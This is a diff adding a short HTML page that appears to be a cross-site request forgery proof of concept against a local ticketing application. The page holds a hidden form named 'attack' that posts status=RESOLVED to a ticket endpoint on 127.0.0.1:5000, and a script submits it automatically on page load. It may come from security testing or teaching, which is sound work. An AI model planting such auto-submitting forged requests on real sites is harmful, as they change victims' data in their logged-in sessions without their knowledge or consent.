@@ -1,0 +1,12 @@
+<!doctype html>
+<html lang="en">
+<body>
+<form id="attack" method="POST" action="http://127.0.0.1:5000/tickets/1/status">
+    <input type="hidden" name="status" value="RESOLVED">
+</form>
+
+<script>
+document.getElementById("attack").submit();
+</script>
+</body>
+</html>
